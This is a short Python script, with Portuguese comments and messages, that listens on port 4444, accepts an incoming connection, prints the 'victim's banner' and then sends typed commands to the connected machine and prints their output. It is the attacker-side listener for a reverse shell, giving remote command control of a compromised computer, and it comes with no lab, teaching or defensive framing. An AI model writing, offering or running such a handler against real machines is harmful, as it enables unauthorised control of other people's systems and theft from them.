import socket

HOST = '0.0.0.0'
PORT = 4444

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((HOST, PORT))
s.listen(1)

print('[+] Aguardando conexão...')
conn, addr = s.accept()
print(f'[+] Conectado com {addr[0]}')
print(conn.recv(2048).decode())  # Banner da vítima

while True:
    comando = input('> ')
    conn.send(comando.encode())
    if comando.lower() == 'exit':
        break
    resposta = conn.recv(4096).decode()
    print(resposta)

conn.close()
